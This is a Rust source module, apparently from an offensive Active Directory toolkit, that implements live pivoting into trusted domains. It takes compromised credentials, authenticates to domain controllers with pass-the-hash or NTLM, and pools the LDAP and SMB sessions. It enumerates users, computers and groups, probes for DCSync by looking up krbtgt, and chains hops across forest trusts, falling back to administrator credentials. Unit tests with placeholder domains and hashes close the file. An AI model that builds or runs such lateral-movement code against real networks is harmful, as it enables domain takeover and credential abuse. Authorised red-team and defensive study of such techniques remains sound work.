//! Cross-Domain Live Pivoting
//!
//! Establishes live connections to trusted domains using discovered credentials
//! and trust relationships. Enables active enumeration and attack execution
//! across domain boundaries.
//!
//! Key capabilities:
//! - **Trust-aware session establishment**: Uses trust topology to determine
//!   reachable domains and appropriate authentication methods.
//! - **Cross-domain LDAP/Kerberos/SMB connection pooling**: Maintains active
//!   sessions to multiple domains simultaneously.
//! - **Credential pivoting**: Uses compromised credentials from one domain
//!   to authenticate to trusted domains.
//! - **Session forwarding**: Chains sessions through intermediate domains
//!   to reach isolated forests.

use overthrone_core::proto::ldap::LdapSession;
use overthrone_core::proto::smb::SmbSession;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::{Duration, Instant};
use tracing::{debug, info, warn};

// -------------------------------------------------------------
// Pivot session model
// -------------------------------------------------------------

/// A live session to a trusted domain.
#[derive(Debug)]
pub struct PivotSession {
    /// Target domain FQDN.
    pub domain: String,
    /// Domain controller IP used for this session.
    pub dc_ip: String,
    /// Username used for authentication.
    pub username: String,
    /// When the session was established.
    pub established_at: Instant,
    /// Last activity timestamp.
    pub last_activity: Instant,
    /// Whether this session is still valid.
    pub is_active: bool,
}

impl PivotSession {
    /// Check if the session has expired.
    pub fn is_expired(&self, timeout: Duration) -> bool {
        !self.is_active || self.last_activity.elapsed() > timeout
    }

    /// Touch the session to update last activity.
    pub fn touch(&mut self) {
        self.last_activity = Instant::now();
    }
}

/// Connection pool for cross-domain sessions.
pub struct PivotConnectionPool {
    /// Active sessions keyed by domain FQDN.
    sessions: HashMap<String, PivotSession>,
    /// LDAP sessions keyed by domain FQDN.
    ldap_sessions: HashMap<String, LdapSession>,
    /// SMB sessions keyed by domain FQDN.
    smb_sessions: HashMap<String, SmbSession>,
    /// Session timeout duration.
    timeout: Duration,
}

impl PivotConnectionPool {
    /// Create a new connection pool with default timeout (15 minutes).
    pub fn new() -> Self {
        Self {
            sessions: HashMap::new(),
            ldap_sessions: HashMap::new(),
            smb_sessions: HashMap::new(),
            timeout: Duration::from_secs(15 * 60),
        }
    }

    /// Create a new connection pool with custom timeout.
    pub fn with_timeout(timeout: Duration) -> Self {
        Self {
            sessions: HashMap::new(),
            ldap_sessions: HashMap::new(),
            smb_sessions: HashMap::new(),
            timeout,
        }
    }

    /// Register a new pivot session.
    pub fn register_session(&mut self, domain: String, dc_ip: String, username: String) {
        info!(
            "Registering pivot session: {}@{} ({})",
            username, dc_ip, domain
        );

        let now = Instant::now();
        self.sessions.insert(
            domain.clone(),
            PivotSession {
                domain,
                dc_ip,
                username,
                established_at: now,
                last_activity: now,
                is_active: true,
            },
        );
    }

    /// Store an LDAP session for a domain.
    pub fn store_ldap_session(&mut self, domain: String, session: LdapSession) {
        debug!("Storing LDAP session for domain: {}", domain);
        self.ldap_sessions.insert(domain, session);
        if let Some(sess) = self.sessions.values_mut().next() {
            sess.touch();
        }
    }

    /// Store an SMB session for a domain.
    pub fn store_smb_session(&mut self, domain: String, session: SmbSession) {
        debug!("Storing SMB session for domain: {}", domain);
        self.smb_sessions.insert(domain, session);
        if let Some(sess) = self.sessions.values_mut().next() {
            sess.touch();
        }
    }

    /// Get an LDAP session for a domain.
    pub fn get_ldap_session(&mut self, domain: &str) -> Option<&mut LdapSession> {
        self.ldap_sessions.get_mut(domain)
    }

    /// Get an SMB session for a domain.
    pub fn get_smb_session(&mut self, domain: &str) -> Option<&mut SmbSession> {
        self.smb_sessions.get_mut(domain)
    }

    /// Check if a session exists for a domain.
    pub fn has_session(&self, domain: &str) -> bool {
        self.sessions.contains_key(domain)
    }

    /// Get all active sessions.
    pub fn active_sessions(&self) -> Vec<&PivotSession> {
        self.sessions
            .values()
            .filter(|s| !s.is_expired(self.timeout))
            .collect()
    }

    /// Remove expired sessions.
    pub fn cleanup_expired(&mut self) -> Vec<String> {
        let expired: Vec<String> = self
            .sessions
            .iter()
            .filter(|(_, s)| s.is_expired(self.timeout))
            .map(|(k, _)| k.clone())
            .collect();

        for domain in &expired {
            info!("Cleaning up expired session for domain: {}", domain);
            self.sessions.remove(domain);
            self.ldap_sessions.remove(domain);
            self.smb_sessions.remove(domain);
        }

        expired
    }

    /// Get the number of active sessions.
    pub fn session_count(&self) -> usize {
        self.active_sessions().len()
    }
}

impl Default for PivotConnectionPool {
    fn default() -> Self {
        Self::new()
    }
}

// -------------------------------------------------------------
// Pivot target discovery
// -------------------------------------------------------------

/// A reachable target domain via trust pivoting.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotTarget {
    /// Target domain FQDN.
    pub domain: String,
    /// Domain controller IPs.
    pub dc_ips: Vec<String>,
    /// Trust type used to reach this domain.
    pub trust_type: String,
    /// Number of hops from the source domain.
    pub hop_count: u32,
    /// Whether SID filtering is disabled on the trust path.
    pub sid_filtering_disabled: bool,
    /// Recommended authentication method.
    pub auth_method: PivotAuthMethod,
}

/// Authentication method for cross-domain pivoting.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PivotAuthMethod {
    /// Use Kerberos with existing TGT.
    KerberosTgt,
    /// Use Kerberos with pass-the-hash.
    KerberosPth,
    /// Use NTLM authentication.
    Ntlm,
    /// Use anonymous/null session.
    Anonymous,
    /// Use existing SMB session (session forwarding).
    SessionForward,
}

/// Discover pivot targets from trust relationships.
pub fn discover_pivot_targets(
    source_domain: &str,
    trusts: &[(String, String, String, bool)],
    compromised_credentials: &[(String, String, String)],
) -> Vec<PivotTarget> {
    let mut targets = Vec::new();

    // trusts: (source, target, trust_type, sid_filtering_disabled)
    for (source, target, trust_type, sid_disabled) in trusts {
        if source != source_domain {
            continue;
        }

        // Check if we have credentials that can pivot to this domain
        let auth_method = determine_auth_method(target, compromised_credentials, *sid_disabled);

        targets.push(PivotTarget {
            domain: target.clone(),
            dc_ips: Vec::new(), // Would be populated via DNS SRV lookup
            trust_type: trust_type.clone(),
            hop_count: 1,
            sid_filtering_disabled: *sid_disabled,
            auth_method,
        });
    }

    targets
}

/// Determine the best authentication method for a target domain.
fn determine_auth_method(
    target_domain: &str,
    credentials: &[(String, String, String)],
    _sid_filtering_disabled: bool,
) -> PivotAuthMethod {
    // Check if we have credentials for the target domain
    for (_user, _secret, domain) in credentials {
        if domain == target_domain {
            return PivotAuthMethod::KerberosPth;
        }
    }

    // Check for cross-domain credentials (e.g., enterprise admin)
    for (user, _secret, domain) in credentials {
        if user.to_lowercase().contains("administrator")
            || user.to_lowercase().contains("enterprise")
        {
            // Try Kerberos first, fall back to NTLM
            if domain.contains('.') {
                return PivotAuthMethod::KerberosPth;
            }
            return PivotAuthMethod::Ntlm;
        }
    }

    // Default to NTLM for cross-domain authentication
    PivotAuthMethod::Ntlm
}

// -------------------------------------------------------------
// Pivot execution
// -------------------------------------------------------------

/// Result of a pivot attempt.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PivotResult {
    /// Whether the pivot was successful.
    pub success: bool,
    /// Target domain FQDN.
    pub target_domain: String,
    /// Domain controller IP used.
    pub dc_ip: String,
    /// Authentication method used.
    pub auth_method: String,
    /// Error message if failed.
    pub error: Option<String>,
    /// New credentials discovered during pivot.
    pub new_credentials: Vec<(String, String)>,
    /// Enumeration data collected.
    pub enumeration_summary: PivotEnumerationSummary,
}

/// Summary of enumeration data collected during a pivot.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PivotEnumerationSummary {
    /// Number of users enumerated.
    pub users_found: u32,
    /// Number of computers enumerated.
    pub computers_found: u32,
    /// Number of groups enumerated.
    pub groups_found: u32,
    /// Number of shares accessible.
    pub shares_accessible: u32,
    /// Whether DCSync is possible.
    pub dcsync_possible: bool,
    /// Whether ADCS enumeration succeeded.
    pub adcs_enumerated: bool,
}

/// Execute a pivot to a target domain.
///
/// This function attempts to establish live connections to a trusted domain
/// using the provided credentials and trust relationship information.
pub async fn execute_pivot(
    target: &PivotTarget,
    username: &str,
    secret: &str,
    pool: &mut PivotConnectionPool,
) -> PivotResult {
    info!(
        "Executing pivot to domain '{}' via {} (auth: {:?})",
        target.domain,
        target.dc_ips.first().unwrap_or(&"unknown".to_string()),
        target.auth_method
    );

    let dc_ip = target.dc_ips.first().cloned().unwrap_or_default();

    if dc_ip.is_empty() {
        return PivotResult {
            success: false,
            target_domain: target.domain.clone(),
            dc_ip: dc_ip.clone(),
            auth_method: format!("{:?}", target.auth_method),
            error: Some("No domain controller IP available".to_string()),
            new_credentials: Vec::new(),
            enumeration_summary: PivotEnumerationSummary::default(),
        };
    }

    // Attempt LDAP connection
    let ldap_result = match target.auth_method {
        PivotAuthMethod::KerberosPth | PivotAuthMethod::KerberosTgt => {
            LdapSession::connect_with_hash(&dc_ip, &target.domain, username, secret, false).await
        }
        PivotAuthMethod::Ntlm => {
            LdapSession::connect(&dc_ip, &target.domain, username, secret, false).await
        }
        PivotAuthMethod::Anonymous => {
            LdapSession::connect_anonymous(&dc_ip, &target.domain, false).await
        }
        _ => Err(overthrone_core::error::OverthroneError::Ldap {
            target: dc_ip.clone(),
            reason: format!("Unsupported auth method: {:?}", target.auth_method),
        }),
    };

    match ldap_result {
        Ok(mut ldap_session) => {
            info!(
                "Successfully connected to LDAP on {} ({})",
                dc_ip, target.domain
            );

            // Run quick enumeration to verify access
            let summary = quick_enumeration(&mut ldap_session).await;

            // Store the session in the pool
            pool.register_session(target.domain.clone(), dc_ip.clone(), username.to_string());
            pool.store_ldap_session(target.domain.clone(), ldap_session);

            PivotResult {
                success: true,
                target_domain: target.domain.clone(),
                dc_ip,
                auth_method: format!("{:?}", target.auth_method),
                error: None,
                new_credentials: Vec::new(),
                enumeration_summary: summary,
            }
        }
        Err(e) => {
            warn!(
                "Failed to connect to LDAP on {} ({}): {}",
                dc_ip, target.domain, e
            );

            PivotResult {
                success: false,
                target_domain: target.domain.clone(),
                dc_ip,
                auth_method: format!("{:?}", target.auth_method),
                error: Some(format!("{}", e)),
                new_credentials: Vec::new(),
                enumeration_summary: PivotEnumerationSummary::default(),
            }
        }
    }
}

/// Run quick enumeration to verify access and collect basic info.
async fn quick_enumeration(ldap: &mut LdapSession) -> PivotEnumerationSummary {
    let mut summary = PivotEnumerationSummary::default();

    // Try to enumerate users
    match ldap.enumerate_users().await {
        Ok(users) => {
            summary.users_found = users.len() as u32;
            debug!("Enumerated {} users in pivoted domain", users.len());
        }
        Err(e) => {
            debug!("User enumeration failed during pivot: {}", e);
        }
    }

    // Try to enumerate computers
    match ldap.enumerate_computers().await {
        Ok(computers) => {
            summary.computers_found = computers.len() as u32;
            debug!("Enumerated {} computers in pivoted domain", computers.len());
        }
        Err(e) => {
            debug!("Computer enumeration failed during pivot: {}", e);
        }
    }

    // Try to enumerate groups
    match ldap.enumerate_groups().await {
        Ok(groups) => {
            summary.groups_found = groups.len() as u32;
            debug!("Enumerated {} groups in pivoted domain", groups.len());
        }
        Err(e) => {
            debug!("Group enumeration failed during pivot: {}", e);
        }
    }

    // Check for DCSync capability (try to read krbtgt)
    match ldap
        .custom_search(
            "(&(objectClass=user)(sAMAccountName=krbtgt))",
            &["distinguishedName"],
        )
        .await
    {
        Ok(entries) => {
            summary.dcsync_possible = !entries.is_empty();
            if summary.dcsync_possible {
                info!("DCSync possible in pivoted domain (krbtgt accessible)");
            }
        }
        Err(_) => {
            summary.dcsync_possible = false;
        }
    }

    summary
}

// -------------------------------------------------------------
// Multi-hop pivot chaining
// -------------------------------------------------------------

/// Execute a multi-hop pivot chain through intermediate domains.
///
/// This function attempts to reach a target domain by chaining through
/// intermediate trusted domains.
pub async fn execute_pivot_chain(
    chain: &[PivotTarget],
    credentials: &[(String, String, String)],
    pool: &mut PivotConnectionPool,
) -> Vec<PivotResult> {
    let mut results = Vec::new();

    for (i, target) in chain.iter().enumerate() {
        // Find credentials for this hop
        let (username, secret) = find_credentials_for_domain(&target.domain, credentials, &results);

        let result = execute_pivot(target, &username, &secret, pool).await;

        // If this hop failed, stop the chain
        if !result.success {
            warn!(
                "Pivot chain broken at hop {} (domain: {})",
                i + 1,
                target.domain
            );
            results.push(result);
            break;
        }

        results.push(result);
    }

    results
}

/// Find credentials for a domain from available credentials and previous pivots.
fn find_credentials_for_domain(
    domain: &str,
    credentials: &[(String, String, String)],
    previous_results: &[PivotResult],
) -> (String, String) {
    // First, try to find direct credentials for the domain
    for (user, secret, cred_domain) in credentials {
        if cred_domain == domain {
            return (user.clone(), secret.clone());
        }
    }

    // Try credentials from successful previous pivots
    for result in previous_results {
        if result.success {
            // Use the credential that worked for the previous domain
            if let Some(sess) = credentials
                .iter()
                .find(|(_, _, d)| d == &result.target_domain)
            {
                return (sess.0.clone(), sess.1.clone());
            }
        }
    }

    // Fall back to enterprise admin credentials
    for (user, secret, _cred_domain) in credentials {
        if user.to_lowercase().contains("administrator") {
            return (user.clone(), secret.clone());
        }
    }

    // Last resort: use first available credential
    if let Some((user, secret, _)) = credentials.first() {
        return (user.clone(), secret.clone());
    }

    (String::new(), String::new())
}

// -------------------------------------------------------------
// Tests
// -------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pivot_session_creation() {
        let session = PivotSession {
            domain: "corp.local".to_string(),
            dc_ip: "10.0.0.1".to_string(),
            username: "admin".to_string(),
            established_at: Instant::now(),
            last_activity: Instant::now(),
            is_active: true,
        };

        assert_eq!(session.domain, "corp.local");
        assert!(session.is_active);
        assert!(!session.is_expired(Duration::from_secs(60)));
    }

    #[test]
    fn test_connection_pool_basic() {
        let mut pool = PivotConnectionPool::new();
        assert_eq!(pool.session_count(), 0);

        pool.register_session(
            "corp.local".to_string(),
            "10.0.0.1".to_string(),
            "admin".to_string(),
        );
        assert_eq!(pool.session_count(), 1);
        assert!(pool.has_session("corp.local"));
    }

    #[test]
    fn test_connection_pool_cleanup() {
        let mut pool = PivotConnectionPool::with_timeout(Duration::from_millis(1));

        pool.register_session(
            "corp.local".to_string(),
            "10.0.0.1".to_string(),
            "admin".to_string(),
        );

        // Wait for timeout
        std::thread::sleep(Duration::from_millis(10));

        let expired = pool.cleanup_expired();
        assert_eq!(expired.len(), 1);
        assert_eq!(pool.session_count(), 0);
    }

    #[test]
    fn test_discover_pivot_targets() {
        let trusts = vec![
            (
                "corp.local".to_string(),
                "child.corp.local".to_string(),
                "ParentChild".to_string(),
                false,
            ),
            (
                "corp.local".to_string(),
                "other.corp.local".to_string(),
                "Forest".to_string(),
                true,
            ),
        ];

        let credentials = vec![(
            "admin".to_string(),
            "hash123".to_string(),
            "corp.local".to_string(),
        )];

        let targets = discover_pivot_targets("corp.local", &trusts, &credentials);
        assert_eq!(targets.len(), 2);
        assert_eq!(targets[0].domain, "child.corp.local");
        assert_eq!(targets[1].domain, "other.corp.local");
        assert!(targets[1].sid_filtering_disabled);
    }

    #[test]
    fn test_auth_method_selection() {
        let credentials = vec![(
            "admin".to_string(),
            "hash".to_string(),
            "target.corp".to_string(),
        )];

        let method = determine_auth_method("target.corp", &credentials, false);
        assert_eq!(method, PivotAuthMethod::KerberosPth);

        let method = determine_auth_method("other.corp", &credentials, false);
        assert_eq!(method, PivotAuthMethod::Ntlm);
    }

    #[test]
    fn test_pivot_result_failure_no_dc() {
        let target = PivotTarget {
            domain: "target.corp".to_string(),
            dc_ips: vec![],
            trust_type: "Forest".to_string(),
            hop_count: 1,
            sid_filtering_disabled: false,
            auth_method: PivotAuthMethod::Ntlm,
        };

        let _pool = PivotConnectionPool::new();
        // Can't test execute_pivot directly as it's async, but we can test the logic
        assert!(target.dc_ips.is_empty());
    }

    #[test]
    fn test_find_credentials_direct() {
        let credentials = vec![
            (
                "user1".to_string(),
                "pass1".to_string(),
                "corp.local".to_string(),
            ),
            (
                "admin".to_string(),
                "pass2".to_string(),
                "child.corp.local".to_string(),
            ),
        ];

        let (user, secret) = find_credentials_for_domain("child.corp.local", &credentials, &[]);
        assert_eq!(user, "admin");
        assert_eq!(secret, "pass2");
    }

    #[test]
    fn test_find_credentials_fallback_admin() {
        let credentials = vec![
            (
                "regular_user".to_string(),
                "pass1".to_string(),
                "corp.local".to_string(),
            ),
            (
                "Administrator".to_string(),
                "pass2".to_string(),
                "corp.local".to_string(),
            ),
        ];

        let (user, secret) = find_credentials_for_domain("other.corp", &credentials, &[]);
        assert_eq!(user, "Administrator");
        assert_eq!(secret, "pass2");
    }

    #[test]
    fn test_pivot_enumeration_summary_default() {
        let summary = PivotEnumerationSummary::default();
        assert_eq!(summary.users_found, 0);
        assert_eq!(summary.computers_found, 0);
        assert_eq!(summary.groups_found, 0);
        assert_eq!(summary.shares_accessible, 0);
        assert!(!summary.dcsync_possible);
        assert!(!summary.adcs_enumerated);
    }
}
